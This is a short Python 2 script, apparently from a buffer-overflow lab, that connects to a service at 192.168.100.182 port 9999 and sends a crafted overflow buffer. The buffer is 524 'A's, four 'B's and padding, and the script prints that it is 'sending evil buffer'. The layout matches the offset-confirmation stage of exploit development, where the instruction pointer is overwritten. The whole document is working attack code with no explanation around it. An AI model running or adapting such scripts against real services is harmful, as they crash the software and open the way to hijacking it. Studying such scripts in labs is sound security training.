#!/usr/bin/python

import socket

payload = "A"*524 + "B"*4 + (700-524-4)*"C"
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('192.168.100.182',9999))
s.recv(1024)
s.send(payload+"\r\n")
print "[*] Sending evil buffer with " + str(len(payload)) + "A's\r\n"
s.close()
